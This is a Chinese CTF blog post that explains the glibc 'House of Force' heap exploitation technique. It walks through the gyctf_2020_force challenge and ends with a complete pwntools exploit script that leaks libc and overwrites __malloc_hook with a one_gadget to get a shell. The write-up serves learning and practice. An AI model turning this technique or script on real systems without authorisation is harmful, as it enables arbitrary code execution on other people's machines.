@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="适用范围2.23~2.29 2.29的libc中增加了top chunk的size域合法性检验 123&#x2F;&#x2F; 申请的大小如果超过系统内存，报错if (__glibc_unlikely(size &gt; av-&gt;system_mem))	malloc_printerr(&quot;malloc(): corrupted top size&quot;);  作用:得到任意地址的chunk 要求:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="House Of Force">
+<meta property="og:url" content="http://example.com/2025/05/20/House-Of-Force/index.html">
+<meta property="og:site_name" content="Welcome!">
+<meta property="og:description" content="适用范围2.23~2.29 2.29的libc中增加了top chunk的size域合法性检验 123&#x2F;&#x2F; 申请的大小如果超过系统内存，报错if (__glibc_unlikely(size &gt; av-&gt;system_mem))	malloc_printerr(&quot;malloc(): corrupted top size&quot;);  作用:得到任意地址的chunk 要求:">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/House-Of-Force/0.png">
+<meta property="og:image" content="http://example.com/images/House-Of-Force/1.png">
+<meta property="og:image" content="http://example.com/images/House-Of-Force/2.png">
+<meta property="og:image" content="http://example.com/images/House-Of-Force/3.png">
+<meta property="og:image" content="http://example.com/images/House-Of-Force/5.png">
+<meta property="og:image" content="http://example.com/images/House-Of-Force/4.png">
+<meta property="article:published_time" content="2025-05-20T11:46:41.389Z">
+<meta property="article:modified_time" content="2025-05-21T10:57:54.749Z">
+<meta property="article:author" content="Sn0r1ax">
+<meta property="article:tag" content="house大家族">
+<meta property="article:tag" content="堆">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/House-Of-Force/0.png">
+
+<link rel="canonical" href="http://example.com/2025/05/20/House-Of-Force/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>House Of Force | Welcome!</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Welcome!</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/05/20/House-Of-Force/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.png">
+      <meta itemprop="name" content="Sn0r1ax">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Welcome!">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          House Of Force
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-05-20 19:46:41" itemprop="dateCreated datePublished" datetime="2025-05-20T19:46:41+08:00">2025-05-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-05-21 18:57:54" itemprop="dateModified" datetime="2025-05-21T18:57:54+08:00">2025-05-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h1><p>2.23~2.29</p>
+<p>2.29的libc中增加了top chunk的size域合法性检验</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 申请的大小如果超过系统内存，报错</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(size &gt; av-&gt;system_mem))</span><br><span class="line">	malloc_printerr(<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>作用:得到任意地址的chunk</p>
+<p>要求:</p>
+<ol>
+<li>控制top chunk的size域</li>
+<li>自由控制分配堆的大小</li>
+</ol>
+<h1 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h1><p>​	通过溢出等方式修改top chunk的size域为一个很大的值(通常为-1,-1的补码为0xffffffff),然后申请一个堆块到指定地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = chunksize(victim);</span><br><span class="line"><span class="comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) </span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder      = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top        = remainder;</span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>将size域改为-1是为了通过这里的if检测,然后申请一个堆块,<code>top chunk</code>的地址就会对应的减去申请的堆块大小,如果申请的是负的大小的堆块,<code>top chunk</code>也会相应的增加对应值</p>
+<h1 id="例题-gyctf-2020-force"><a href="#例题-gyctf-2020-force" class="headerlink" title="例题 gyctf_2020_force"></a>例题 gyctf_2020_force</h1><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p><img src="/../images/House-Of-Force/0.png" alt="0"></p>
+<p><code>main</code>函数没啥看的</p>
+<p><img src="/../images/House-Of-Force/1.png" alt="1"></p>
+<p>这里存在堆溢出漏洞,每次<code>malloc</code>结束还贴心的把堆地址告诉你</p>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><p>在<code>arena</code>未初始化之前或者初始化后申请一块大于<code>top chunk</code>大小的堆块会直接调用<code>sysmalloc</code>来申请内存,这块内存的地址与libc基址有着固定偏移,可以借此来泄露libc基址</p>
+<h3 id="改malloc-hook为ogg"><a href="#改malloc-hook为ogg" class="headerlink" title="改malloc_hook为ogg"></a><del>改malloc_hook为ogg</del></h3><p>这里直接改<code>malloc_hook</code>为<code>one_gadget</code>经测试行不通,因为无法满足其条件,只能另寻他法或者想办法构造<code>one_gadget</code>的条件</p>
+<p>我们这里选择通过realooc来满足<code>one_gadget</code>的条件</p>
+<h3 id="通过realloc来使one-gadget条件成立"><a href="#通过realloc来使one-gadget条件成立" class="headerlink" title="通过realloc来使one_gadget条件成立"></a>通过realloc来使<code>one_gadget</code>条件成立</h3><p><img src="/../images/House-Of-Force/2.png" alt="2"></p>
+<p>我们选择的是这条<code>one_gadget</code>,它的约束是<code>rsp+0x30</code>处要为NULL,而我们realloc中刚好有一条</p>
+<p><img src="/../images/House-Of-Force/3.png" alt="3"></p>
+<p>可以调整rsp的位置</p>
+<p><img src="/../images/House-Of-Force/5.png" alt="5"></p>
+<p>直接用修改<code>malloc_hook</code>为ogg</p>
+<p><img src="/../images/House-Of-Force/4.png" alt="4"></p>
+<p>通过<code>realloc</code>改变rsp后</p>
+<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">elf = ELF(<span class="string">&#x27;./gyctf_2020_force&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/mnt/d/CTFs/gyctf2020/force/libc-2.23.so&#x27;</span>)</span><br><span class="line">context(arch=elf.arch, os=elf.os,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process([elf.path])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25740</span>)</span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG <span class="keyword">and</span> local:</span><br><span class="line">	gdb.attach(io, </span><br><span class="line">	<span class="string">&#x27;&#x27;&#x27;	</span></span><br><span class="line"><span class="string">	b *$rebase(0xbcc)</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p    = <span class="keyword">lambda</span>      : pause()</span><br><span class="line">ru   = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl   = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">r    = <span class="keyword">lambda</span> x    : io.recv(x)</span><br><span class="line">s   = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl   = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia   = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla  = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa   = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x    : u32(r(x).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x    : u64(r(x).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg  = <span class="keyword">lambda</span> x,y  : log.success(<span class="built_in">str</span>(x) + <span class="string">&#x27; -&gt; &#x27;</span> + <span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">     sla(<span class="string">&quot;puts\n&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">     sla(<span class="string">&quot;size\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">     ru(<span class="string">&#x27;bin addr &#x27;</span>)</span><br><span class="line">     addr = <span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">     sla(<span class="string">&quot;content\n&quot;</span>,content)</span><br><span class="line">     <span class="keyword">return</span> addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">     sla(<span class="string">&quot;puts\n&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    libc.address = add(<span class="number">0x21000</span>,<span class="string">&#x27;s&#x27;</span>) - <span class="number">0x5ca010</span></span><br><span class="line">    payload0 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + <span class="string">b&#x27;w&#x27;</span> * <span class="number">0x8</span> + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">    heap_addr = add(<span class="number">0x10</span>,payload0)</span><br><span class="line">    lg(<span class="string">&#x27;heap&#x27;</span>,heap_addr)</span><br><span class="line">    lg(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line">    <span class="comment">#p()</span></span><br><span class="line">    lg(<span class="string">&#x27;malloc_hook&#x27;</span>,libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>])</span><br><span class="line">    dest = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span> - (heap_addr + <span class="number">0x10</span>) - <span class="number">0x10</span> - <span class="number">0x10</span></span><br><span class="line">    add(dest,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">    p()</span><br><span class="line">    ogg = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">b&#x27;x&#x27;</span> * <span class="number">0x8</span> + p64(libc.address + ogg[<span class="number">1</span>]) + p64(libc.sym[<span class="string">&#x27;realloc&#x27;</span>] + <span class="number">0x10</span>))</span><br><span class="line">    p()</span><br><span class="line">    sla(<span class="string">&#x27;puts\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;size\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line">    </span><br><span class="line">    ia()</span><br></pre></td></tr></table></figure>
+
+<p>本地通了,buuctf的远程没打通,原因不明</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
+<li>house of force通过改变<code>top chunk</code>的size域使在申请一块非常大的堆块时不会适用<code>sysmalloc</code>来向系统申请映射内存,进而改变<code>top chunk</code>的位置</li>
+<li>在申请的内存大于<code>top chunk</code>时,系统会调用<code>sysmalloc</code>来像系统申请映射内存,申请的内存地址与libc基址有着,固定偏移可以通过该内存地址来leak libc</li>
+<li>在更改<code>__malloc_hook</code>为<code>one_gadget</code>时,如果因约束条件与栈上数据有关而失败可以尝试构造<code>__malloc_hook-&gt;realloc + 0x10-&gt;one_gadget</code>的方式来尝试满足<code>one_gadget</code>的约束条件,因为<code>realloc</code>函数里有一条<code>sub rsp,0x38</code>的指令</li>
+<li>用我的脚本在55行这里调试用<code>heap</code>指令看的时候显示的只有最开始<code>sysmalloc</code>分配的堆块,但是实际上<code>top chunk</code>是已经到了目标位置的,自己调试的时候可以注意下这里</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/house%E5%A4%A7%E5%AE%B6%E6%97%8F/" rel="tag"># house大家族</a>
+              <a href="/tags/%E5%A0%86/" rel="tag"># 堆</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/05/15/%E4%BB%A3%E7%A0%81%E6%81%A2%E5%A4%8D/" rel="prev" title="代码恢复">
+      <i class="fa fa-chevron-left"></i> 代码恢复
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4"><span class="nav-number">1.</span> <span class="nav-text">适用范围</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="nav-number">2.</span> <span class="nav-text">利用原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98-gyctf-2020-force"><span class="nav-number">3.</span> <span class="nav-text">例题 gyctf_2020_force</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="nav-number">3.1.</span> <span class="nav-text">静态分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-number">3.2.</span> <span class="nav-text">利用思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#leak-libc"><span class="nav-number">3.2.1.</span> <span class="nav-text">leak libc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B9malloc-hook%E4%B8%BAogg"><span class="nav-number">3.2.2.</span> <span class="nav-text">改malloc_hook为ogg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E8%BF%87realloc%E6%9D%A5%E4%BD%BFone-gadget%E6%9D%A1%E4%BB%B6%E6%88%90%E7%AB%8B"><span class="nav-number">3.2.3.</span> <span class="nav-text">通过realloc来使one_gadget条件成立</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4exp"><span class="nav-number">3.3.</span> <span class="nav-text">完整exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Sn0r1ax"
+      src="/uploads/avatar.png">
+  <p class="site-author-name" itemprop="name">Sn0r1ax</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/PMexeggcute" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;PMexeggcute" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sn0r1ax</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
